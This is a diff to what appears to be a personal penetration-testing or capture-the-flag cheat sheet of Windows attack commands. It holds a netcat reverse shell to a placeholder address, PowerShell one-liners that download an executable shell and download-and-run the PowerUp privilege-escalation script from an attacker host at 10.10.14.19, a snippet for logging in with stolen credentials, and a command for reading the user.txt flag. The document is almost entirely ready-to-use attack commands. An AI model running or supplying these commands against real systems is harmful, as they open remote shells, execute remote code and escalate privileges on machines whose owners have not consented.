@@ -13,3 +13,17 @@ nc.exe -e cmd.exe x.x.x.x 1234
 
 #Download shell
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.19:80/dev4444.exe', 'dev4444.exe')"
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.19/PowerUp.ps1');Invoke-AllChecks
+
+#Login as User
+#Once as User start new
+$username = 'DOMAION\username' 
+$securePassword = ConvertTo-SecureString -AsPlainText -Force 'password'
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Enter-PSSession -ComputerName localhost -Credential $credential
+
+whoami
+bart\h.potter
+
+#To get file in certain location
+cmd.exe /c "type c:\location\user.txt"
